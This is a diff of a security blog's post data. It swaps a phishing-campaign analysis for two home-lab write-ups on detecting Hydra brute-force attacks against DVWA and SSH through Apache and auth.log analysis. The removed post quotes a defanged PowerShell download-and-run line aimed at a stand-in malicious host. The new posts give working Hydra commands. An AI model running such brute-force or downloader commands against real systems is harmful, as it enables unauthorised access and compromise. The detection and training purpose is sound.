@@ -10,90 +10,463 @@ export interface BlogPost {
 
 export const blogPosts: BlogPost[] = [
   {
-    slug: "dissecting-phishing-campaign",
-    title: "Dissecting a Phishing Campaign: From Email to C2",
+    slug: "web-attack-detection-lab",
+    title: "Web Attack Detection Lab: Brute Force Detection using Docker + Ubuntu + Kali",
     summary:
-      "A step-by-step breakdown of a real-world phishing attack chain — header analysis, payload extraction, sandbox results, and IOC mapping to MITRE ATT&CK.",
-    date: "Jan 2025",
-    tags: ["Phishing", "Incident Response"],
-    readTime: "8 min read",
-    content: `## Overview
+      "Built a structured SOC-level lab to simulate a brute force web attack using Hydra and detect it through Apache log analysis inside a Docker-based DVWA environment.",
+    date: "3rd Mar 2026",
+    tags: ["SIEM", "SOC", "Log Analysis", "Brute Force", "Blue Team"],
+    readTime: "10 min read",
+    content: `## 🔥 Project Overview
 
-In this write-up, I walk through a real-world phishing campaign I analyzed during a SOC shift. The attack chain began with a seemingly legitimate invoice email and ended with a remote access trojan (RAT) beaconing to a command-and-control server.
+Instead of random practice, I built a structured SOC-level detection lab from scratch.
 
-## Initial Triage
+Goal:
 
-The alert fired from our email gateway when a user reported a suspicious attachment. Here's what stood out:
+- Simulate a real web brute force attack
+- Capture Apache logs
+- Analyze attack behavior
+- Detect brute force activity
+- Document incident like a SOC analyst
 
-- **Subject line:** "Invoice #INV-2025-0042 — Payment Overdue"
-- **Sender domain:** Spoofed to resemble a known vendor
-- **Attachment:** \`.xlsx\` file with embedded macros
+Lab Environment:
 
-### Email Header Analysis
-
-\`\`\`
-Received: from mail-evil[.]com (198.51.100.23)
-X-Mailer: PHPMailer 6.1.4
-Return-Path: <billing@leg1tvendor[.]com>
-\`\`\`
-
-The \`Return-Path\` didn't match the \`From\` header — a classic spoofing indicator. SPF and DKIM both failed for the sending domain.
-
-## Payload Analysis
-
-I extracted the macro from the \`.xlsx\` attachment using \`olevba\`:
-
-\`\`\`bash
-olevba invoice_2025_0042.xlsx
-\`\`\`
-
-The macro contained obfuscated PowerShell that downloaded a second-stage payload:
-
-\`\`\`powershell
-$url = "hxxps://cdn-update[.]evil/payload.exe"
-Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\\svchost.exe"
-Start-Process "$env:TEMP\\svchost.exe"
-\`\`\`
-
-## Sandbox Results
-
-I detonated the payload in an isolated sandbox:
-
-| Indicator | Value |
-|-----------|-------|
-| **File hash (SHA256)** | \`a1b2c3d4e5f6....\` |
-| **C2 Server** | \`198.51.100.50:443\` |
-| **Protocol** | HTTPS with custom cert |
-| **Persistence** | Registry Run key |
-| **Classification** | AsyncRAT variant |
-
-## IOC Mapping to MITRE ATT&CK
-
-| Technique | ID | Description |
-|-----------|----|-------------|
-| Phishing: Spearphishing Attachment | T1566.001 | Malicious Excel with macros |
-| Command and Scripting Interpreter | T1059.001 | PowerShell downloader |
-| Boot or Logon Autostart Execution | T1547.001 | Registry Run key persistence |
-| Application Layer Protocol | T1071.001 | HTTPS C2 communication |
-
-## Containment & Response
-
-1. **Isolated** the affected endpoint from the network
-2. **Blocked** the C2 IP and domain at the firewall and proxy
-3. **Scanned** all mailboxes for the same sender/subject combination
-4. **Reset** the user's credentials as a precaution
-5. **Submitted** IOCs to our threat intel platform
-
-## Lessons Learned
-
-- Email gateway rules were updated to flag \`.xlsx\` files with macros from external senders
-- Detection rule added for PowerShell downloading executables to \`%TEMP%\`
-- User awareness training reinforced for invoice-themed phishing
+- Attacker: Kali Linux (192.168.223.156)
+- Target: Ubuntu Server (192.168.223.145)
+- Application: DVWA (Docker container)
+- Port: 8080
+- Log Source: Apache access.log
 
 ---
 
-*This analysis was performed in a controlled environment. All IOCs have been defanged for safe sharing.*`,
+## 🏗 Phase 1: Lab Setup
+
+Installed Docker on Ubuntu:
+
+\`\`\`bash
+sudo apt update
+sudo apt install docker.io -y
+sudo systemctl start docker
+\`\`\`
+
+Deployed DVWA:
+
+\`\`\`bash
+docker run -d -p 8080:80 vulnerables/web-dvwa
+\`\`\`
+
+📸 Screenshot 1:
+docker ps showing container running
+
+---
+
+### 🔴 Mistake #1: Port Mapping Issue
+
+Initially, DVWA was not accessible.
+
+Cause:
+Incorrect port mapping.
+
+Fix:
+Re-ran container using proper -p 8080:80 mapping.
+
+Lesson:
+Always verify container port exposure.
+
+---
+
+## 🌐 Phase 2: Accessing DVWA
+
+Opened:
+
+http://192.168.223.145:8080
+
+Login:
+admin / password
+
+Security level set to LOW.
+
+📸 Screenshot 2:
+DVWA login page
+
+---
+
+## ⚔ Phase 3: Brute Force Attack (Red Team)
+
+Executed Hydra from Kali:
+
+\`\`\`bash
+hydra -l admin -p password 192.168.223.145 -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"
+\`\`\`
+
+Attack Source:
+192.168.223.156
+
+Hydra generated multiple rapid login attempts.
+
+📸 Screenshot 3:
+Hydra attack running
+
+---
+
+### 🔴 Mistake #2: Incorrect Hydra Syntax
+
+Initially attack failed because:
+
+- Wrong form path
+- Missing failure message string
+
+After correcting form path and response condition, attack executed successfully.
+
+Lesson:
+Understanding HTTP request structure is critical in brute force simulations.
+
+---
+
+## 🛡 Phase 4: Log Analysis (Blue Team)
+
+Accessed Docker container:
+
+\`\`\`bash
+docker exec -it dd9c04bb55fc /bin/bash
+\`\`\`
+
+Checked Apache logs:
+
+\`\`\`bash
+ls /var/log/apache2
+\`\`\`
+
+Found:
+- access.log
+- error.log
+
+📸 Screenshot 4:
+Apache log directory listing
+
+---
+
+Filtered brute force entries:
+
+\`\`\`bash
+grep "vulnerabilities/brute" /var/log/apache2/access.log
+\`\`\`
+
+Observed:
+
+- Repeated requests
+- Same IP multiple times
+- Rapid execution
+
+📸 Screenshot 5:
+Filtered brute log entries
+
+---
+
+## 📊 Phase 5: Counting Attack Attempts
+
+To confirm brute force behavior:
+
+\`\`\`bash
+grep "vulnerabilities/brute" /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c
+\`\`\`
+
+Output:
+
+99 192.168.223.156
+
+This confirmed 99 login attempts from a single IP.
+
+📸 Screenshot 6:
+Frequency output showing 99 attempts
+
+---
+
+## 🧠 Detection Logic (SIEM Simulation)
+
+Defined threshold rule:
+
+If login attempts from same IP > 10  
+→ Trigger brute force alert
+
+Actual attempts:
+99
+
+Result:
+Attack Successfully Detected
+
+This simulates how SIEM correlation rules detect brute force attacks.
+
+---
+
+## 📄 Incident Summary
+
+Attack Type: HTTP Brute Force  
+Attacker IP: 192.168.223.156  
+Target: DVWA on Port 8080  
+Log Source: Apache access.log  
+Total Attempts: 99  
+Detection Status: Successful  
+
+---
+
+## 🛠 Recommendations
+
+- Enable account lockout
+- Implement rate limiting
+- Deploy Fail2Ban
+- Add Web Application Firewall
+- Integrate logs into SIEM
+
+---
+
+## 📘 Lessons Learned
+
+- Docker networking must be verified
+- Hydra requires precise form configuration
+- Log analysis is fundamental in SOC
+- Frequency-based detection is effective for brute force identification
+
+---
+
+## ✅ Project Completion
+
+This lab successfully demonstrated:
+
+✔ Attack simulation  
+✔ Log capture  
+✔ Manual detection  
+✔ Basic SIEM-style correlation logic  
+✔ Incident documentation  
+
+This marks the completion of the Web Attack Detection Lab.
+
+---
+
+⚠ Conducted in a controlled lab environment for educational purposes only.
+`
   },
+  {
+  slug: "ssh-brute-force-detection-lab",
+  title: "SSH Brute Force Detection Lab: Auth.log Analysis using Ubuntu + Kali",
+  summary:
+    "Simulated an SSH brute force attack from Kali Linux and detected it through Linux auth.log analysis, applying SOC-style threshold-based detection logic.",
+  date: "Mar 2026",
+  tags: ["SOC", "Blue Team", "Linux Security", "Auth.log", "Brute Force"],
+  readTime: "8 min read",
+  content: `## 🔥 Project Overview
+
+After building a web brute force detection lab, I extended my SOC practice to system-level attack detection.
+
+Goal:
+
+- Simulate SSH brute force attack
+- Analyze Linux authentication logs
+- Detect failed login attempts
+- Implement threshold-based detection logic
+
+Lab Environment:
+
+- Attacker: Kali Linux (192.168.223.156)
+- Target: Ubuntu Server (192.168.223.145)
+- Service: SSH (Port 22)
+- Log Source: /var/log/auth.log
+
+---
+
+## 🏗 Phase 1: Lab Preparation
+
+First, I ensured SSH was installed and running on Ubuntu:
+
+\`\`\`bash
+sudo apt install openssh-server -y
+sudo systemctl start ssh
+sudo systemctl status ssh
+\`\`\`
+
+Verified port 22 was active.
+
+📸 Screenshot 1:
+SSH service status active
+
+---
+
+### 🔴 Mistake #1: SSH Not Running
+
+Initially SSH connection failed from Kali.
+
+Cause:
+SSH service was not started.
+
+Fix:
+Started service manually using:
+sudo systemctl start ssh
+
+Lesson:
+Always verify service status before attack simulation.
+
+---
+
+## ⚔ Phase 2: SSH Brute Force Attack (Red Team)
+
+From Kali Linux, I launched Hydra against SSH:
+
+\`\`\`bash
+hydra -l root -P rockyou.txt ssh://192.168.223.145
+\`\`\`
+
+This generated multiple failed login attempts.
+
+Attack Source:
+192.168.223.156
+
+---
+
+📸 Screenshot 2:
+Hydra SSH brute force running
+
+Caption:
+SSH brute force attack initiated from Kali Linux.
+
+---
+
+### 🔴 Mistake #2: Incorrect Username
+
+Initially used wrong username which didn’t exist.
+
+Fix:
+Verified valid system users using:
+cat /etc/passwd
+
+Then retried attack with correct username.
+
+Lesson:
+Reconnaissance is important before brute force attempts.
+
+---
+
+## 🛡 Phase 3: Log Analysis (Blue Team)
+
+Moved to Ubuntu to analyze logs.
+
+Viewed authentication logs:
+
+\`\`\`bash
+cat /var/log/auth.log
+\`\`\`
+
+Filtered failed login attempts:
+
+\`\`\`bash
+grep "Failed password" /var/log/auth.log
+\`\`\`
+
+Observed:
+
+- Multiple failed login attempts
+- Same IP repeated
+- Rapid authentication failures
+
+---
+
+📸 Screenshot 3:
+Failed password entries from auth.log
+
+Caption:
+Repeated failed SSH login attempts detected.
+
+---
+
+## 📊 Phase 4: Counting Attack Attempts
+
+To confirm brute force activity:
+
+\`\`\`bash
+grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c
+\`\`\`
+
+Output example:
+
+25 192.168.223.156
+
+This confirmed repeated authentication failures from a single IP.
+
+---
+
+📸 Screenshot 4:
+IP frequency count output
+
+Caption:
+Frequency-based detection confirming SSH brute force behavior.
+
+---
+
+## 🧠 Detection Logic (SIEM Simulation)
+
+Defined detection rule:
+
+If failed SSH login attempts > 5 within short time  
+→ Trigger brute force alert
+
+Actual attempts:
+25
+
+Result:
+SSH Brute Force Attack Successfully Detected
+
+This simulates how SOC teams monitor authentication logs.
+
+---
+
+## 📄 Incident Summary
+
+Attack Type: SSH Brute Force  
+Attacker IP: 192.168.223.156  
+Target Service: SSH (Port 22)  
+Log Source: /var/log/auth.log  
+Total Failed Attempts: 25  
+Detection Status: Successful  
+
+---
+
+## 🛠 Recommendations
+
+If this were a production server:
+
+- Disable root SSH login
+- Implement key-based authentication
+- Enable account lockout
+- Install Fail2Ban
+- Monitor auth.log continuously
+- Integrate logs into SIEM platform
+
+---
+
+## 📘 Lessons Learned
+
+- System logs are critical for detecting authentication attacks
+- SSH brute force is easily detectable via frequency analysis
+- Basic Linux commands can simulate SIEM-style detection
+- Proper service hardening is essential for security
+
+---
+
+## ✅ Project Completion
+
+This lab successfully demonstrated:
+
+✔ SSH brute force simulation  
+✔ Authentication log monitoring  
+✔ Frequency-based detection  
+✔ SOC-style incident reporting  
+
+This marks the completion of the SSH Brute Force Detection Lab.
+
+---
+
+⚠ Conducted in a controlled lab environment for educational purposes only.
+`
+},
   {
     slug: "building-detection-rules-sigma-splunk",
     title: "Building Detection Rules with Sigma & Splunk",
